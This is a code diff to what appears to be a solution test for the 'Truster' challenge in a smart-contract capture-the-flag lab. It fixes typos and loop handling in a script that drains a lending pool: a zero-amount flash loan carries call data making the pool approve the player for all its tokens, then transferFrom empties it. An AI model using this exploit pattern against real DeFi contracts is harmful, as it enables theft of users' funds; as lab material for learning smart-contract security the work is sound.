@@ -28,6 +28,7 @@ describe('[Challenge] Truster', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
         async function attackWithContract() {
+            console.log('ATTACK WITH CONTRACT')
             const attackContractFactory = await ethers.getContractFactory(
                 'AttackTruster'
             )
@@ -43,15 +44,16 @@ describe('[Challenge] Truster', function () {
             })
         }
 
-        async function attack() {
-            const attackData = token.interface.encodeFuntionData('approve', [
+        async function attackWithScript() {
+            console.log('ATTACK WITH SCRIPT')
+            const attackData = token.interface.encodeFunctionData('approve', [
                 player.address,
                 TOKENS_IN_POOL
             ])
 
             const flashLoanTx = {
                 to: pool.address,
-                data: pool.interface.encodeFuntionData('flashLoan', [
+                data: pool.interface.encodeFunctionData('flashLoan', [
                     0,
                     player.address,
                     token.address,
@@ -61,7 +63,7 @@ describe('[Challenge] Truster', function () {
 
             const transerTx = {
                 to: token.address,
-                data: token.interface.encodeFuntionData('transferFrom', [
+                data: token.interface.encodeFunctionData('transferFrom', [
                     pool.address,
                     player.address,
                     TOKENS_IN_POOL
@@ -70,10 +72,12 @@ describe('[Challenge] Truster', function () {
 
             const txs = [flashLoanTx, transerTx]
 
-            txs.forEach(async (tx) => await player.sendTransaction(tx))
+            for (const tx of txs) {
+                await player.sendTransaction(tx)
+            }
         }
 
-        await attack()
+        await attackWithScript()
         // await attackWithContract()
     })
 
